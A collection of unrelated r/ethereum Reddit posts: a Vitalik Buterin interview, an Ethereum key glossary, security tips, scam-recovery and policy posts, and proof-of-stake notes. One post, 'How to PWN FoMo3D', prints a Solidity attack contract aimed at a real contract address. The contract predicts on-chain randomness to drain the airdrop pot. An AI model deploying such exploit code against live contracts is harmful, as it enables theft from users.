It may even save some of you from doing bad investments, and maybe see what direction you should look in, and maybe shed some light on the possible future of the crypto.I find that the crypto waters are murky today and Vitalik's thoughts make it clearer for me.[Link to the source on Rusbase](https://rb.ru/opinion/buterin-rock-and-roll/)---In 2017 the Ethereum founder Vitalik Buterin made it to the top ten of the most influential young people according to the Fortune magazine. Some call him the crypto god, some – a crypto-anarchist, and some just idolize him.Any rumor on Vitalik affects the Ethereum exchange rate and costs or makes the Ethereum holders large amounts of money.Rusbase attended an open discussion with the rock star of blockchain and got to know what the 23-year-old genius thinks and what happens in the industry.**On himself and Ethereum**1. How did I become interested in blockchain? There was a moment when I realized that this is a very interesting technology with strong mathematics and then I understood that there was a serious concept behind this, a transparency system. A community of several thousand people created their own financial system. This idea is very close to me. I like building something that no one has ever built before.2. Creating Ethereum was not a question of money, it was a mission, an idea that you want to follow.3. In 2011 I learned about bitcoin, and six months later I cofounded a bitcoin magazine [Bitcoin Magazine – Ed.], two years later I was in the university [University of Waterloo - Ed.] and I was spending 30 hours a week on bitcoin programming tasks. Then I dropped out, traveled around, and watched blockchain projects develop in different countries of the world. In Israel, USA, Europe.4. The idea to create Ethereum was not an immediate one. At first, I pitched it in the project that I worked in. But I was told it'd take a year to complete it. Then I quit. I remember walking around San Francisco, thinking, and then I just wrote a white paper and sent it to my friends, and they shared it with their friends. And it all started.  **On mining**5. The role of mining will decrease over time. This trend is not promising.6. Mining as a business... This happens when you have your own source of energy or a subsidized source of energy. Then this is profitable. But anyway it's better to move towards the blockchain application, not speculation.7. If you want to invest money, invest it in R&D.    **On the blockchain prospects**8. The first and the biggest blockchain prospect of the blockchain development is the financial one. This is cryptocurrencies, smart contracts, and state registry. For example, now it takes you several weeks to sell a house, whereas it can take just 3 minutes.9. Besides the financial area, I'd say the following areas are prospective: the Internet security; the logistics; anything that has to do with identity; a more expensive but also a safer information storage.10. The advantage of the blockchain is that there is a lot of data in the network that you can use for different purposes. The simplest example is the smart contract that lets you decrease the need for other types of insurance.   **On ICOs**11. The problem with ICOs is that someone makes something useful for a very small amount of people. Everyone sees now that there is open source software where you can make money easily. The developers now have the option to keep working in the basement or buy a Lamborghini.12. There are now so many projects where the token is absolutely useless and people just want to make a lot of money.13. The ICO concept is too centralized. The problem is that people evaluate the idea and not the team behind it. The investors put their money in the idea and there is no guarantee that the team will actually manage to do it. I think one needs to keep an eye on this and keep investing only if it's successful. And a better way would be to invest in the idea and not a specific team as there should be several teams competing for the investments to implement the idea.14. The moment will come when the market realizes that many of the tokens that exist today have no value.15. Tokening must have a purpose. The majority of the ICOs today don't have any backing and will fail.   **On the cryptocurrency prospects**16. I think that the cryptocurrency will not replace money 100% but in 20 to 40 years there's going to be a lot of different cryptocurrencies that will be used together.17. The number of cryptocurrencies is going to increase. There will be cryptocurrencies for different cities, big companies will issue their own cryptocurrencies, like that Burger King case I heard about.18. In 50 years everyone will have a wallet with 15 different types of cryptocurrency and you will be able to use them to make payments.   **On the blockchain security**19. There is a paradox now. The purpose of the blockchain is security. But the blockchain is a new technology that has security issues.20. Right now you can safely use blockchain where no one will take damage if the blockchain breaks.   **On Russia**21. Attracting the investments based on blockchain is a very interesting thing for Russia, especially when you consider the imposed sanctions.22. The expertise of the IT professionals in Russia is high, but there's just not enough of them.23. No other country has the same degree of the desire to implement the technology. In Russia any place you go – everyone discusses the blockchain, everyone is fascinated by it: from the higher officials to the small time entrepreneurs.24. The blockchain in Russia needs smaller successful projects to prove itself.   **On the world**25. The blockchain is a part of the bigger trend. The world is becoming more and more digital. In 50 years people are going to have more friends abroad than in their own country.26. Southeast Asia is very technological, but they don't have the same amount of interest as there's here [in Russia]. However, people there use QR-codes to sell oranges.   **A happy end**27. The cryptocurrencies are never going to be stable. However, the degree of volatility is going to decrease with the emergence of successful blockchain startups and with the increase in the volume of money in the cryptocurrencies. This will happen in a year or two.28. The blockchain now is in Phase 3. Here's what this means:* Phase 1: Several hacker anarchists become interested in it.* Phase 2: Putin knows what blockchain is – this is the hype phase.* Phase 3:  The road from the hype to the real results. People know that the blockchain is an interesting idea. People know how to use it and they are already testing it. However, there's still no application on the big scale.**EDIT**: I am disappointed that this has become a political discussion, 'Russia is bad and corrupt'. Make of that what you will. Don't let the media brainwash you. Russia has many problems just like any other government.

For additional security, you can use a password to encrypt your private key which would result in a `username (public)` and `password (private)` and `password for that password (private + more secure)`. See the `Keystore File` section.### Address *('Public Key')*- You use this to send funds **to** an account.  - Sometimes referred to as the 'public key'- A string made up of `0x` + `40 hexadecimal characters`.- In Ethereum, the address begins with `0x`.- Example: `0x06A85356DCb5b307096726FB86A78c59D38e08ee`### Public Key- In cryptography, you have a keypair: the public and private key.- You can derive a public key from a private key, but cannot derive a private key from a public key.- (Advanced) In Ethereum, the address 'acts' like the public key, but it's not actually the public key.- (Advanced) In Ethereum, the public key is derived from the private key and is 128 hex characters. You then take the `'SHA3' (Keccak-256)` hash of this (64 characters), take the last 40 characters, and prefix  with `0x`, give you your 42-character address.### Private Key- You use this to send funds **from** an account.  - The secret half of your Address / public key.- A string of 64 hexadecimal characters.- ([Almost](https://crypto.stackexchange.com/questions/30269/are-all-possible-ec-private-keys-valid)) every string of 64 hexadecimal characters is a private key. - If you hand-type a private key differently today than yesterday, you will access a different wallet. Never hand type your private key.- This is the string you need to send from your account. Without it you cannot access your funds. Although, you don't need to save this raw, unencrypted private key in this format. You can saving the fancy versions of it (e.g. the Keystore File / Mnemonic Phrase).- Example: `afdfd9c3d2095ef696594f6cedcae59e72dcd697e2a7521b1578140422a4f890`### Keystore File- Encrypted version of your private key in JSON format (though it does not have a JSON extension) - A fancy version of your private key that is protected by a password of your choosing.- When combined with the password, it has the private key.- Safer than a private key because you need the password.- File name usually is in the format `UTC` + `--` + `DATE_CREATED` + `--` + `YOUR_ADDRESS_WITHOUT_THE_OX`- Example of File Nae: `UTC--2017-07-02T20-33-09.177Z--06a85356dcb5b307096726fb86a78c59d38e08ee`- Example of Contents: `{'version':3,'id':'aa811d53-fe9a-44a2-bd1c-e737007b5591','address':'06a85356dcb5b307096726fb86a78c59d38e08ee','Crypto':{'ciphertext':'f5a7cc8d4b8cf93510b0d0d057f3a52ac79fd48e619e0638c4ffd978ca180248','cipherparams':{'iv':'975ab00192e2dd74170e91ca59c0b0bd'},'cipher':'aes-128-ctr','kdf':'scrypt','kdfparams':{'dklen':32,'salt':'0210f0d0b99e440dfbceb36373304638bac093a367ee7da6411cd165f7aa907a','n':1024,'r':8,'p':1},'mac':'8197a747a3855a10546a2ff939c36470daed78e393b670efa0c12fe3b23dd7e3'}}`- (pw: `mypassword`)### Mnemonic Phrase- Another fancy version of your private key, that is actually used to derive multiple private keys.- A (typically) 12 or 24 word phrase that allows you to access infinite number of accounts.- Used by Ledger, TREZOR, MetaMask, Jaxx, and others.- Originates from [BIP 39 Spec](https://github.com/bitcoin/bips/blob/master/bip-0039.mediawiki).- The accounts you can access with this phrase are determined by the 'path'.- Example 12-words: `brain surround have swap horror body response double fire dumb bring hazard`- Example 24-words: `card enrich gesture connect kick topple fan body blind engine lemon swarm venue praise addict agent unaware equal bean sing govern income link leg`### Hardware Wallet:- Typically, a single-purpose device that 'holds' your private key(s), ensuring your private keys are safe.- Typically, they use a 24-word phrase. This phrase you should write down (not on your computer) and store separately from your hardware wallet.- If you lose your hardware wallet, you can still gain access to your accounts & funds via the word-phrase you wrote down.- Never type the word-phrase on your computer. It defeats the purpose of your hardware wallet.### AddressIdenticon / AddressIcon:- The colorful blob of colors that corresponds to your address.- It is an easy way to see if your address is correct.- [Example 1](http://i.imgur.com/lHUrIiZ.jpg)- [Example 2](http://i.imgur.com/FvyLewS.jpg)- *Note: the above addresses are a single character different but have remarkably different icons & colors. Magic!*### Hexadecimal- Used all over Ethereum for a variety of things, a hexadecimal string is comprised of the numbers `0 1 2 3 4 5 6 7 8 9` and `A B C D E F`### Seed- The input given to derive a private key. This should always be generated in a truly random way, not something you make up with your measly human brain.- If you chose the seed, it is known as a `brain wallet`### Brain Wallet- An account generated from a seed or password or passphrase of your choosing.- Humans are not capable of generating enough entropy and therefore the wallets derived from these phrases are insecure.- Brain wallets can be brute forced by super fast computers.- [Brain wallet are insecure.](https://www.reddit.com/r/ethereum/comments/45y8m7/brain_wallets_are_now_generally_shunned_by/)- Don't use brain wallets.### Entropy- Also known as 'randomness'.- The more random something is, the more entropy it has, and the more secure it is.- Usually defined in 'bits of entropy' or the number of years it would take to brute-force a ________ (e.g. private key) derived with that much entropy.- Ethereum private keys are 256-bit keys- 24-Word mnemonic phrases are also 256 bits of entropy. 2048 words in the dictionary. 11 bits of entropy (the words). `11 * 24 = 264`.

Looking through the code, it's multiple contracts totaling thousands of lines of code. Let's be honest, $12M inside thousands of lines of Solidity... that's asking for it.One thing that immediately caught my eye whilst looking through their code was:    modifier isHuman() {      address _addr = msg.sender;      uint256 _codeLength;          assembly {_codeLength := extcodesize(_addr)}      require(_codeLength == 0, 'sorry humans only');      _;    }Ok, lemme rename that. I believe '`isHumanOrContractConstructor'` is a much better name for it. I guess you see where this is going. If the entire FoMo3D contract suite is based on the assumption that it can only be called from plain accounts (i.e. you can't execute complex code and can't do reentrancy)... they're going to have a bad time with constructors.We now have our attack vector, but we still need to find a place to use it. I'm sure there are a few places to attempt to break the code, but the second thing that caught my eye was:    /**    * @dev generates a random number between 0-99 and checks to see if thats    * resulted in an airdrop win    * @return do we have a winner?    */    function airdrop()    private    view    returns(bool)    {      uint256 seed = uint256(keccak256(abi.encodePacked(      (block.timestamp).add      (block.difficulty).add      ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)).add      (block.gaslimit).add      ((uint256(keccak256(abi.encodePacked(msg.sender)))) / (now)).add      (block.number)      )));          if((seed - ((seed / 1000) * 1000)) < airDropTracker_)        return(true);      else        return(false);    }Oh boy! On chain random number generation... just what we needed! I.e. at this point, we can create transactions that within their constructor can calculate the result of this '`airdrop()'` method, and if it's favorable, can call arbitrary methods on the FoMo3D contract (potentially multiple times).Looking through the code to see where '`airdrop'` is being used, we can find that that any contribution larger than 0.1 Ether gets a chance to win 25% of some ingame stash. And that's the last missing piece of the puzzle. We can create a contract that can 100% win (or not play in the first place). So, here's a full repro ('*'*I didn't test it mind you, just wrote up the pseudocode, it may not be fully functional yet'*'*).    pragma solidity ^0.4.24;        interface FoMo3DlongInterface {      function airDropTracker_() external returns (uint256);      function airDropPot_() external returns (uint256);      function withdraw() external;    }        contract PwnFoMo3D {      constructor() public payable {        // Link up the fomo3d contract and ensure this whole thing is worth it        FoMo3DlongInterface fomo3d = FoMo3DlongInterface(0xA62142888ABa8370742bE823c1782D17A0389Da1);        if (fomo3d.airDropPot_() < 0.4 ether) {          revert();        }        // Calculate whether this transaction would produce an airdrop. Take the        // 'random' number generator from the FoMo3D contract.        uint256 seed = uint256(keccak256(abi.encodePacked(          (block.timestamp) +          (block.difficulty) +          ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)) +          (block.gaslimit) +          ((uint256(keccak256(abi.encodePacked(msg.sender)))) / (now)) +          (block.number)        )));            uint256 tracker = fomo3d.airDropTracker_();        if((seed - ((seed / 1000) * 1000)) >= tracker) {          revert();        }        // Ok, seems we can win the airdrop, pwn the contract        address(fomo3d).call.value(0.1 ether)();        fomo3d.withdraw();        selfdestruct(msg.sender);      }    }I didn't get to try out my little exploit, because the attack loses 0.1 ether for every 'airdrop' call, so the only way to make it worthwhile is to wait until the airdrop's prize is > 0.1 ether. Given the 25% payout, that means airdrops need to total to > 0.4 ether. However, I saw a peculiarity that it never actually went above that value. So digging through the chain, I actually found someone who was skimming the airdoprs for 2 days now :))[https://etherscan.io/txs?a=0x73b61a56cb93c17a1f5fb21c01cfe0fb23f132c3](https://etherscan.io/txs?a=0x73b61a56cb93c17a1f5fb21c01cfe0fb23f132c3)[https://etherscan.io/tx/0x86c3ff158b7e372e3e2aa964b2c3f0ca25c59f7bcc95a13fd72b139c0ab6f7ad](https://etherscan.io/tx/0x86c3ff158b7e372e3e2aa964b2c3f0ca25c59f7bcc95a13fd72b139c0ab6f7ad)Their attack code is not really available, but looking through a successful transaction you can see that they have a more elaborate pwner code: they try to deploy a new contract, but if the address is not a winner (per the evaluation of '`airdrop()'`, they don't revert, rather keep creating nested contracts until one succeeds). GG!This attack only PWNs 1% of the FoMo3D contract suite as only that's the amount sent into airdrops. But to paraphrase the devs from their contracts: '*'*'lolz''*'*.And the team's reaction: yeah, we knew our 12M contract can be broken, no biggie.[https://twitter.com/PoWH3D/status/1021380251258114049](https://twitter.com/PoWH3D/status/1021380251258114049)https://preview.redd.it/v4xlb6ga8pb11.png?width=1164&format=png&auto=webp&v=enabled&s=b0f64f7ef2e36d6c4f499d32ff8660eb179c0904",False,"How to PWN FoMo3D, a beginners guide",,0,667,0.89,https://www.reddit.com/r/ethereum/comments/916xni/how_to_pwn_fomo3d_a_beginners_guide/,[]

This will help all the newbies navigate the security measures in cryptoverse.&#x200B;* **ENABLE 2FA Authenticator everywhere. Use a separate email for crypto. Use google authenticator instead of SMS authenticator. NO QUESTIONS ASKED.*** **You take it off the exchange. You do not leave your coins on the exchange.  ' NOT YOUR KEYS, NOT YOUR COINS.'** The only times I leave coins on the exchange is when I know that I am looking to buy more coins in the next several hours. That way I avoid paying fees multiple times to withdraw from the wallet. But with coins like ADA , SOL, ONE where the fees is so low that it might even be worth getting the coins off the exchange even if you do intend to buy more coins in the next 12-24 hours.  **Alternatively, if you bought BTC or ETH/ERC-20 tokens,** you could possibly wait till your done accumulating for the session and then pay the fee at once to pull your coins out. Sure you have to pay the transaction fees but hey, that's the cost of doing business here.*  ALWAYS do regular scans on your main computer which you use to buy/store your coins for malware and other threats. *  Never publicly reveal your holdings. Never trust anyone who reveals their holdings publicly either. They are either malicious or they are lying or they are just stupid. You do not need to associate with such people in any case.*  Never use the email you use for your social accounts as your exchange's email. If you have made that mistake already, consider changing the mail or alternatively changing the account. Yes, it may sound extreme but it is worth it.*  Do not visit shady websites from your main computer. Sure, you may have anti-virus but do not risk it. Especially avoid visiting illegal websites that stream shows, sports events and porn.*  Do invest in a hardware wallet as soon as you feel it is worth it. BUT MAKE SURE that you buy directly from the manufacturer's website or from a very reputable retailer.*  I would always suggest choosing wallets which have multiple assets storage over  storing your assets in separate chrome extension wallets. Particular example comes to mind with EXODUS vs YOROI when staking ADA. *  FACT CHECK EVERYTHING. I have lost quite a bit (not crypto but in general) by not questioning people because I was afraid I would offend them. If they are correct, they will always be delighted to prove their point. * DOUBLE CHECK EVERYTHING. Double check whether you pasted the correct wallet address. Double check the authenticator code. Double check whether the girl you like is only into you for your crypto.

That motivated me to submit a lengthy explanation on how it was the future of the internet, the price would eventually recover and there was nothing to worry about. Turns out Ethereum is officially dead again, selling at 130 usd. Why? Because it is boring. The ICO craze is over and we're experimenting a long-lasting hangover. Normal people are saturated with crypto and going on with their lives. Google trends are down. Nobody is here. You can hear the crickets. And that won't change any soon. But, once again, there is nothing to worry about, as long as you're patient: eventually things will change because, as I've told you before, credit cards are stupid, fiat is mortal, and Ethereum has the perfect momentum to eventually become the worldwide economy; it can't die, by design. Once we have new exciting stuff that makes people entertained and curious, they'll be back. Meanwhile, here are some suggestions to have some fun and speed up this process.## A book seriesFirst, we really need a good series based on crypto. I'm thinking of something like cyber wars, where people around the world realize crypto is money, and money is power, thus online factions fight over control over it all. It should be realistic and reference the real crypto history as much as possible, giving coolish explanations for things like Satoshi Nakamoto, MtGox, TheDAO incident, Bitconnect and so on; there is endless source of material. I'd say a good book would aggregate more value on the field as 3.6 research breakthroughs. Don't underestimate the power of literature to moving people's mind. Any writer around?## Funding developers just to develop things they likeDevelopers are the most important resource we have They're the crypto equivalent of cattle in Indian culture. They build the towers and castles that protect our lands from all evil. They're sacred. Problem is, developers need food to survive, and that little inconvenience causes most of them to get sucked by projects that have money. And guess who has money? Scammy ICOs. What I'm saying is that, honestly, most developers of this field, today, are working in projects that produce no real value. It is a well-known fact that the most amazing inventions of humanity came from developers on their spare times, working in things they loved. See Gmail, Youtube, Twitter, Facebook and the wheel. As such, I suggest we start a decentralized platform to give developers crypto-currencies to just develop what they like. No question asked. As long as they're building stuff, and they're enjoying it, we should give them $$$. If we can give millions to scammy ICOs, we can do that. I hypothesize that, as a result, mind-blowing things will be created and we'll grow at a unforeseen pace. So, let's do it!## GamesWe need to build games. But not games like CryptoKitties which, while cool as a concept, are essentially classic games in a blockchain suit. We need games that are truly decentralized. Think of a huge RPG world where people can travel around, battle, collect epic items and trade them in an emerging economy. But not only that: a game without a central developer, where people all around the world contributing with art, map, code, and a decentralized system for adopting changes. Or, who know, an e-sport such as a MOBA like LoL, or a card game like Heartstone, without a central company behind its development. The good thing about games is that they're so inclusive, people love games, and it takes one good game to make a case for crypto. We need more of them!## A governmentYou may or may not have noticed, but governments are fueled by money. The only reason you have to pay taxes to the U.S. is that it is powerful (rich) enough to force you to. Once crypto-currencies inevitably become more valuable than fiat, the power of those states will decrease. There will be anti-tax movements, people will stop respecting governments, and eventually the old power will fade away as decentralized governments emerge. That is far from happening, of course, but we can already experiment. So, I have a suggestion: let's create the Decentralized State of Earth! A pretend-to-be universtal state with laws, taxes and even an army. When someone asks, it is just a silly joke, and our army is actually composed by kitten. Of course, secretly, we'll be building a real army of dolphins....That's it. Thanks for listening to this old man!

I thought all of my money was lost, and hit a dead end everywhere I looked, but luckily all hope wasn't lost, and I was able to miraculously recover my funds + basically doubled what I had while causing the scammers to waste thousands of dollars on gasNow for the meat and the potatoes of what happened as soon as I got scammed. I immediately freaked out and tried to do whatever I can to uncover the identity of these scammers. The phishing website they created (now deleted) was https://fox-game.art/ and i did a Whois lookup, but the scammers had covered their tracks pretty well [as seen here](https://imgur.com/a/zIh0eZm). They'd used namecheap (which basically hides their true email, IP, address, phone number, etc) so the details of the website couldn't be traced back to them.Now I decided lemme check out the blockhain and see previous transactions that they did, [from their address](https://etherscan.io/address/0x1d8d12f3f242ef6c409b2fec7ebb0dcdfcfa348a), and I found out they had sent their funds over to a [proxy address](https://etherscan.io/tx/0x7f692afe5e4e81509506ecca24445e5393cacee6f9a9502d4f5d65521ee0b5aa) before [cashing out via fixedfloat](https://etherscan.io/tx/0xf37593fb40eaf81e8c1d7630ca64e3e7e3f4f6dcaed923077863c1eec3956039)Armed with this info I fired off an email o fixedfloat, and to the privacy email address which was connected to their email (think of it like a string of characters that each individual using namecheap has, but until they reply, their real email isn't exposed), and hoped that something happened. As a matter of fact, something did happen. Fixedfloat reached out to me and announced they blacklisted their wallet, and they'd freeze their funds the next time they made a transaction, and the scammers, freaked out by the threatening email I sent tried to cash out 0.067 eth, or the amount the scammed from me via fixedfloat as a test to see if my threat had any sustenance.And it did! Fixedfloat froze the 0.067 eth they sent, and the scammers freaking out emailed me( don't know if I can share em here because of doxxing stuff) but they immediately refunded the eth they stole from me, and started begging me to tell fixed float that I had made a mistake with my report, so I decided to play their game, and wasted their time by telling them that the only way I'd help em out is if they sent 1 ETH to the burn address, but sadly they were cheap stakes and realized that the situation had reached a point of no return, and basically moved their funds out via tornado cashFixedfloat said they'd refund me if they got an email from a law enforcement agency and pass on the scammers info, or if 3 months passed, and they didn't hear anything back from them (I'm pretty sure they don't have anything to say since the scammers spent 0.15 ETH a moving money into tornadocash)Either way, I was super lucky that the scammers took my bait and responded to my email I sent, and they revealed their email, as well as refunded me, but there are a couple of things you can do if your in a similar situation, and ended up getting scammed, even though prevention and being smart is the best way to avoid the headache in the first place. 1. Do a Whois lookup, and try to find the scammers email or other identifying information and reach out to them, and notify them that your going to report them to law enforcement unless they refund you 2. Check out their wallet, because they have to convert their crypto to fiat at one point, and often use a swap service or centralized exchange, to whom you can reach out to  3. File a police report and contact other law enforcement entities because most exchanges will use that to release their funds back to you, if they seize em, or forward their information to law enforcement agencies so they can pursue charges",False,How I used the blockchain against scammers who scammed me and got them to double my funds free of charge,,6,654,0.97,https://www.reddit.com/r/ethereum/comments/r861k7/how_i_used_the_blockchain_against_scammers_who/,[]

The politicians are hard at work to our detriment.Everyone needs to do their part to kill bills like this. I'm having a heck of a time getting traction to kill it in MT.This exact bill is in other states right now. In the link I listed below it shows you where to go to lookup if the bill is in your state. We need help in MT and other states. This crap is buried in a 150 page bill about uniform code revision...like all the other bills.It made it out of the MT senate and will now go to MT house. If you are in MT (or not) and would like to help stop this bill, please contact me. The current legislation working through the system in Montana. Buried in a 150 page bill is (that has a ridiculous title - Generally revise uniform commercial code) :' (y) 'Money' means a medium of exchange that is currently authorized or adopted by a domestic or (15) foreign government. The term includes a monetary unit of account established by an intergovernmental (16)organization or by pursuant to an agreement between two or more countries. The term does not include an (17) electronic record that is a medium of exchange recorded and transferable in a system that existed and operated (18) for the medium of exchange before the medium of exchange was authorized or adopted by the government.This year similar bills were successfully vetoed by Kristi Noem in SD, and AZ killed it as well. But other states aren't so lucky. We all need to fight these kinds of bills. We will not be able to do all the good we want or be our own bank. I suggest you find some watchdog groups in your state. One of the watchdogs in my state sent out a big alert. Take action in your state.While the banking industry is burning (by design) to introduce CBDC...they are busy making sure we are stuck in their rigged system.The language of the bill basically says that when the government says the dollar is invalid, and there is something to replace it, then that's final an no one can resist it.They are implementing it on a state level so there will be no wiggle room.Montana's bill is SB 370 and OPPOSE. If you do take action and call or email the committee, please be respectful and courteous. If you are not they throw away the messages.The first link is from a sub stack dude that explains what is going on and what this bill means. All the bills going through right now for revision in UCC have the EXACT same wording. Go to minute 48 - 52 minutes. This will give the best explanation straight outta their own mouth. He specifically gives information on how Bitcoin is money by todays standards.Lastly, another user Waldo, helped me with this. This CBDC bill is truly mind numbing.

One of them is now on the edge of bankruptcy. There is a huge danger in narrowing that list to two. If a large percentage of people decide to sell after what's happened, how can we know that Coinbase and Binance have enough liquidity to facilitate withdrawals? The gains that crypto has seen dwarf the revenue collected by exchanges. One of the first things that happened during the Great Depression were mass attempts to withdraw cash from banks who did not have that cash on hand. Stable coins are not a solution. If you can't sell them, you can't spend them. Tether limited is not a central bank. No matter how much USDT is minted, they cannot create more USD out of thin air.I'm not trying to fear monger, but people should be more concerned and should be demanding more transparency for centralized exchanges.

Most of these benefits will theoretically become available *immediately* after the merge.* **Block time distribution**: in PoW, blocks are distributed according to a [Poisson distribution](https://en.wikipedia.org/wiki/Poisson_distribution), so there is a high variance between the time between two blocks. On average you get one block per 13 seconds, but there are occasional intervals where there's more than 30 or even more than 60 seconds between two blocks. When you send a transaction, on average you have to wait 13 seconds for the next block to appear. In PoS, blocks appear on a regular schedule: one block per 12 seconds, and when you send a transaction, on average you have to wait 6 seconds. The only exception is skipped proposers, which are rare. Combined with EIP 1559, this will massively improve Ethereum's UX.* **Faster pre-finality confirmation**: we talk about finality, where after '~2 epochs a block gets confirmed in such a way that it cannot feasibly be reverted. But even before then, security ramps up much more quickly than in PoW, because the LMD GHOST fork choice rule with hundreds of attestations in parallel creates much faster convergence than PoW's 'one consensus step per block' model. After even just 12 seconds, a block already has hundreds of attesters supporting it, already making it very hard to revert.* **Better light client protocols**: light clients for PoW ethereum [exist](https://medium.com/@rauljordan/a-primer-on-ethereum-blockchain-light-clients-f3cadde49137), but they are far less efficient than they could be, and they still require quite a bit of time and resources to turn on and maintain. The PoS light client protocol is [much more well-designed](https://github.com/ethereum/eth2.0-specs/blob/dev/specs/altair/sync-protocol.md) after learning from this experience, and requires only a minimum few kilobytes per day to stay in sync. This can make in-browser and mobile PoS light client wallets much more viable, reducing trust on centralized providers.* **Faster ability to detect network issues**: in a PoW network, if half of nodes go offline or start acting improperly because of a bug, hack or attack, it takes some time for this to become known, because at first there's not enough information to distinguish what's going on from random chance. In a PoS network, on the other hand, you can easily see participation dropping from 99% to something much lower within a single slot, and you immediately know that something is going on.There are also many smaller secondary benefits. The PoS switch gives us a natural opportunity to coordinate on a time when the ETH network protocol stops supporting the pre-merge chain, resetting the amount of data that clients need to download. The existing data structures in the beacon chain (particularly the historical block root and state root list) make accessing history from within the EVM much easier (the same benefit that [EIP 2935](https://eips.ethereum.org/EIPS/eip-2935) was trying to accomplish). The SSZ structure makes history proofs of any kind much easier to implement; additionally, a more complete switch from RLP to SSZ could significantly simplify Merkle proof generation for the protocol in general.The merge isn't just about the switch to proof of stake by itself; there's a lot more that we get along with it!",False,Some less-appreciated benefits of Ethereum's PoS,,25,600,0.99,https://www.reddit.com/r/ethereum/comments/mxo151/some_lessappreciated_benefits_of_ethereums_pos/,[]

I am in a unique position of being part of both their Consensus and Construct 2017 conferences and wanted to share my perspective on their company, staff, and how they recently handled a situation involving [Omar Bham](https://twitter.com/OmarBham) and his [Youtube Channel](https://www.youtube.com/user/obham001).## Situation with Omar**tl;dr: Youtuber Omar live streamed content from Coindesk's Consensus 2017 conference and Coindesk acted hostile and unprofessional in their handling of a well respected community member. Now Omar's Youtube channel has been banned from live streaming for 3 months.**Omar Bham is a Youtuber who discusses relevant cryptocurrency news. I met him in person recently at Consensus 2017 and found him to be a very nice,  enthusiastic guy. As part of his cryptocurrency channel, he posted content, including live content, from Consensus 2017. Omar recently released a YouTube video where he discusses his exchange between himself and the Head of Strategy at Coindesk via email and the actions Coindesk took. [Click here for a the full story from Omar](https://www.youtube.com/watch?v=4CmsVeNk2Qc&t=1306s).- Head of Strategy at Coindesk contacted Omar by email to set up a call to arrange payment for licensing Coindesk's content that appeared on Omar's site. - Omar responded that he would need to delay the call as his flight back from Consensus was delayed and would be unavailable.- Omar asked that they reschedule or just send him the details on the payment/licensing terms via email.- Coindesk replies the next day> Hi Omar. Since we did not connect today and you have no permission or authorization from Coindesk, please remove all videos related to Consensus from your website, computer, thumb drive, YouTube channel, and any other soft or hard copies **immediately**. Attendees are not permitted to record at the event as per our terms and conditions of attendees. Please confirm that all materials have been deleted as of today. Regards, [Employee Name]'- Omar took screenshots before the conference of any Terms and Conditions he could find to make sure he would not be breaking any rules before the conference.- After reading the email, Omar tried to delete the videos from his channel, but found that he had a 'copyright strike' from Coindesk. Because 4 of his live streamed videos were flagged for copyright violations, Omar has lost the ability to live stream from his channel for 3 months.## Coindesk the Company and StaffThe staff at Coindesk are incredible. Throughout multiple conferences I have gotten to know many of them. They truly care about the crypto community. There has been some backlash recently against Coindesk over perceived favoritism of ETC compared to ETH, or downplaying ETH all together. Here are some things that I am sure of:- All of the writers I know, which are most of the ones who report on Ethereum, are not against ETH.- Although Coindesk is owned by Digital Currency Group (DCG), none of the writers that I know are directly or indirectly influenced by DCG or anyone at DCG (including Barry Silbert). - DCG supports both ETH and ETC through their subsidiaries and companies they have invested in such as Grayscale and Etherscan.## Bottom Line and What I Want Out of This- I want an explanation from Coindesk that includes a copy of the attendee terms and conditions that they claim Omar is violating. I would also like to know the licensing costs. I am currently in violation of the ToC based on [this video that is still online](https://twitter.com/hudsonjameson/status/866639904326995968).

I'm the guy who put together and demonstrated [Toastycoin and Burnable Payments](http://www.toastycoin.com). After Toastycoin, I scratched my head a lot over how to scale up the research and development of more cryptoeconomic primitives.**This has lead me to start a free, virtual academy, focused on the rapid development of smart contracts and their interfaces.** Seminars start next Monday, and a schedule will be announced later this week. Seminars will be archived publicly.No enrollment process--just tune in live (and ask questions!) or watch the archives.## CPA: The CryptoPrimitive Academy[CPA](http://cpacademy.io) is a non-profit, non-coin enterprise founded on two major premises:1. There is a large, untapped pool of talented developers, who would be happy to help build the dapp ecosystem--if only they had a reliable source of personalized guidance for determining not only **how to build dapps**, but more fundamentally, **what to build and why.**2. A subset of dapps, known as **cryptoeconomic primitives**, will likely be the bedrock upon which larger Ethereum applications are built. But because cryptoeconomic primitives are (by definition) non-proprietary, they don't return profit or increase coin value--so research and development into this field is lacking. Addressing this lack would directly increase the utility of Ethereum to developers, thereby indirectly doing the same for users.CPA will bring these two dynamics together first by designing and developing cryptoeconomic primitives live via the seminars, but also by viewing work on cryptoeconomic primitives as a kind of opt-in coursework.Students who choose to engage in this coursework can apply for CPA accreditation, which will be granted if they've made substantial progress on the cryptoeconomic primitive in question, without significant outside guidance.We expect to cultivate a welcoming community made up of students of varying skillsets, which both educates its members and produces cryptoeconomic primitives that directly increase Ethereum's utility.### Office HoursStarting next Monday, I'll be online and available, minus occasional lunch/coffee breaks, between **UTC weekdays 17:00 and 01:00.** During this time, I'll be available on the CryptoPrimitive slack ([invite here](https://cp-slack-invite.herokuapp.com/)) to answer any questions related to the coursework.### Pre-reqsWe will assume all students are comfortable with OOP and can understand simple JS and/or Python code. Anyone can join the seminars, of course, but we may ignore questions that seem to come from ignorance in these areas.### SeminarsSeminars will start next week on Monday, and occur on a regular weekly schedule. This schedule will be determined after reviewing the comments from this post, but remember that all seminars will be archived and publicly available.Most seminars will consist of me simply livestreaming the design and development of a cryptoeconomic primitive from the ground up, verbalizing my thought process, and doing my best to answer any questions in the chat. Some questions will be answered more fully in a blog post at the end of each week.The first two seminars will be livestreamed development of an extremely basic dapp, and will serve as a tour around some of the tools used. The first seminar will focus on building the contract itself (Solidity), and the second will focus on the interface (JS and/or Python).Subsequent seminars will focus on implementing specific cryptoeconomic primitives, continuing in the style of livestreamed development with Q&A. When deciding on the next project to tackle during the seminars, I'll be taking student interest heavily into account.The exact schedule and subjects of the first set of seminars will be determined later this week and sent out to the mailing list. Sign up for that [here](https://visitor.r20.constantcontact.com/d.jsp?llr=cfjazc6ab&p=oi&m=1130743473314&sit=ke8rgopmb&f=30cfc2bd-aba1-4875-b771-77dd294e1eaa).### CourseworkCoursework is optional, unless one wants to become accredited. All coursework will focus on cryptoeconomic primitives: non-proprietary, simple tools or apps that are immediately practical (whether stand-alone or as a building block for larger systems).By the time seminars start on Monday, we will have provided a list of cryptoeconomic primitive tasks and projects. CPA will provide direct guidance to any student capable of pushing any of these tasks or projects forward in meaningful ways. We expect this list to grow quickly, as the field of crytpoeconomic primitives seems rich 